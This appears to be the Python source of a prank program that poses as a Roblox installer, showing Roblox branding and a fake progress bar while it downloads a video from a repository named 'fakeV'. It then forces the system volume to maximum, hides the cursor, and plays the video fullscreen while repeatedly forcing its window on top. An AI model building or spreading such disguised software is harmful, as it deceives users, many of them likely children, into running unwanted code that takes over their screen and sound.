# main.py
import os
import sys
import time
import ctypes
import threading
import subprocess
import tempfile
import traceback
import urllib.request
import tkinter as tk

# ---------- Config ----------
INSTALL_DIR = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")), "fvData")
VIDEO_PATH  = os.path.join(INSTALL_DIR, "vid.mp4")
VIDEO_URL   = "https://raw.githubusercontent.com/forrealbugi-exp/fakeV/main/data/vid.mp4"

# ---------- Volume to 100 ----------
def set_volume_100():
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(1.0, None)
    except Exception as e:
        print("Volume error:", e)

# ---------- Downloader ----------
def download_file(url, dest, progress_cb=None):
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    tmp = dest + ".part"
    req = urllib.request.Request(url, headers={"User-Agent": "Roblox-Installer"})
    with urllib.request.urlopen(req) as r:
        total = int(r.headers.get("Content-Length", 0) or 0)
        done = 0
        with open(tmp, "wb") as f:
            while True:
                chunk = r.read(65536)
                if not chunk:
                    break
                f.write(chunk)
                done += len(chunk)
                if progress_cb and total:
                    progress_cb(done / total)
    os.replace(tmp, dest)

# ---------- Force topmost ----------
def force_topmost(stop_event, own_pid):
    user32 = ctypes.windll.user32
    HWND_TOPMOST   = -1
    SWP_NOSIZE     = 0x0001
    SWP_NOMOVE     = 0x0002
    SWP_SHOWWINDOW = 0x0040
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)

    def cb(hwnd, _):
        wpid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(wpid))
        if wpid.value == own_pid and user32.IsWindowVisible(hwnd):
            user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                                SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW)
        return True

    proc = WNDENUMPROC(cb)
    while not stop_event.is_set():
        user32.EnumWindows(proc, 0)
        stop_event.wait(0.25)

# ---------- Standalone playback (no VLC) ----------
def play_video(path):
    import imageio_ffmpeg
    from PIL import Image, ImageTk
    import winsound

    ffmpeg_exe = imageio_ffmpeg.get_ffmpeg_exe()
    CREATE_NO_WINDOW = 0x08000000

    # --- Extract the audio track to a temp WAV so winsound can play it ---
    wav_path = os.path.join(tempfile.gettempdir(), "fv_audio.wav")
    try:
        subprocess.run(
            [ffmpeg_exe, "-y", "-i", path, "-vn",
             "-acodec", "pcm_s16le", "-ar", "44100", "-ac", "2", wav_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW,
        )
    except Exception as e:
        print("Audio extract error:", e)
        wav_path = None

    # --- Open frame generator ---
    gen = imageio_ffmpeg.read_frames(path, pix_fmt="rgb24")
    meta = next(gen)
    vw, vh = meta["size"]
    fps = meta["fps"] or 30.0

    # --- Fullscreen topmost Tk window ---
    root = tk.Tk()
    root.title("")
    root.configure(bg="black")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.config(cursor="none")

    label = tk.Label(root, bg="black", bd=0)
    label.pack(expand=True, fill="both")

    root.update_idletasks()
    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()

    stop_event = threading.Event()
    threading.Thread(target=force_topmost,
                     args=(stop_event, os.getpid()),
                     daemon=True).start()

    # --- Start audio in parallel ---
    if wav_path and os.path.exists(wav_path):
        try:
            winsound.PlaySound(wav_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        except Exception as e:
            print("Audio play error:", e)

    # --- Frame loop ---
    frame_delay = 1.0 / fps
    next_t = time.perf_counter()
    try:
        for frame in gen:
            if stop_event.is_set():
                break
            try:
                img = Image.frombytes("RGB", (vw, vh), frame)
                if (vw, vh) != (sw, sh):
                    img = img.resize((sw, sh), Image.BILINEAR)
                tkimg = ImageTk.PhotoImage(img)
                label.configure(image=tkimg)
                label.image = tkimg
                root.update()
            except tk.TclError:
                break  # window was closed

            next_t += frame_delay
            dt = next_t - time.perf_counter()
            if dt > 0:
                time.sleep(dt)
            else:
                next_t = time.perf_counter()  # we're behind; resync
    except Exception as e:
        print("Frame loop error:", e)
    finally:
        try: gen.close()
        except Exception: pass
        try: winsound.PlaySound(None, winsound.SND_PURGE)
        except Exception: pass
        stop_event.set()
        try: root.destroy()
        except Exception: pass
        try:
            if wav_path and os.path.exists(wav_path):
                os.remove(wav_path)
        except Exception: pass

# ---------- Roblox-style installer ----------
class InstallerApp:
    W, H = 480, 400
    BAR_H = 70
    BLACK  = "#000000"
    BAR_BG = "#232527"

    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Roblox")
        self.root.resizable(False, False)
        self.root.configure(bg=self.BLACK)
        self.root.attributes("-topmost", True)

        self.root.update_idletasks()
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        self.root.geometry(f"{self.W}x{self.H}+{(sw - self.W) // 2}+{(sh - self.H) // 2}")

        self.cancelled = False
        self.canvas = tk.Canvas(self.root, width=self.W, height=self.H,
                                bg=self.BLACK, highlightthickness=0, bd=0)
        self.canvas.pack(fill="both", expand=True)
        self._draw()
        self.root.protocol("WM_DELETE_WINDOW", self.cancel)

    @staticmethod
    def _square_points(cx, cy, half, theta):
        import math
        c_, s_ = math.cos(theta), math.sin(theta)
        base = [(-half, -half), (half, -half), (half, half), (-half, half)]
        pts = []
        for x, y in base:
            rx = x * c_ - y * s_
            ry = x * s_ + y * c_
            pts.extend([cx + rx, cy + ry])
        return pts

    def _draw(self):
        import math
        c = self.canvas
        cx = self.W / 2
        cy = (self.H - self.BAR_H) / 2
        theta = math.radians(18)
        c.create_polygon(self._square_points(cx, cy, 76, theta),
                         fill="white", outline="white")
        c.create_polygon(self._square_points(cx, cy, 26, theta),
                         fill="black", outline="black")

        bar_y = self.H - self.BAR_H
        c.create_rectangle(0, bar_y, self.W, self.H, fill=self.BAR_BG, outline="")
        self.progress_line = c.create_rectangle(0, bar_y, 0, bar_y + 2,
                                                fill="#00a2ff", outline="")
        c.create_text(26, bar_y + self.BAR_H / 2, anchor="w",
                      text="RØBLOX", fill="white",
                      font=("Arial Black", 17, "bold"))

        bw, bh = 78, 30
        bx = self.W - 22 - bw
        by = bar_y + (self.BAR_H - bh) / 2
        rect = c.create_rectangle(bx, by, bx + bw, by + bh,
                                  fill="#2b2e31", outline="#4a4d4f",
                                  width=1, tags=("cancel_btn", "btn_rect"))
        c.create_text(bx + bw / 2, by + bh / 2,
                      text="Cancel", fill="white",
                      font=("Segoe UI", 10),
                      tags=("cancel_btn", "btn_text"))

        def on_enter(_):
            c.itemconfig(rect, fill="#3a3d40"); c.config(cursor="hand2")
        def on_leave(_):
            c.itemconfig(rect, fill="#2b2e31"); c.config(cursor="")
        def on_click(_): self.cancel()

        c.tag_bind("cancel_btn", "<Enter>", on_enter)
        c.tag_bind("cancel_btn", "<Leave>", on_leave)
        c.tag_bind("cancel_btn", "<Button-1>", on_click)

    def _set_progress(self, p):
        bar_y = self.H - self.BAR_H
        self.canvas.coords(self.progress_line, 0, bar_y, self.W * p, bar_y + 2)

    def start_install(self):
        threading.Thread(target=self._install_worker, daemon=True).start()

    def _install_worker(self):
        try:
            def cb(p): self.root.after(0, self._set_progress, p)
            download_file(VIDEO_URL, VIDEO_PATH, cb)
            if self.cancelled: return
            self.root.after(250, self._close)
        except Exception as e:
            print("Install error:", e)
            if not self.cancelled:
                self.root.after(0, lambda: self.canvas.itemconfig("btn_text", text="Error"))

    def cancel(self):
        self.cancelled = True
        self._close()

    def _close(self):
        try:
            self.root.quit(); self.root.destroy()
        except Exception: pass

    def run(self):
        self.root.after(150, self.start_install)
        self.root.mainloop()
        return not self.cancelled

# ---------- Main ----------
def main():
    if not os.path.exists(VIDEO_PATH):
        ok = InstallerApp().run()
        if not ok or not os.path.exists(VIDEO_PATH):
            return
    set_volume_100()
    play_video(VIDEO_PATH)

if __name__ == "__main__":
    try:
        main()
    except Exception:
        # Show a message box if anything blows up so it's never silent
        ctypes.windll.user32.MessageBoxW(0, traceback.format_exc(), "fvData error", 0x10)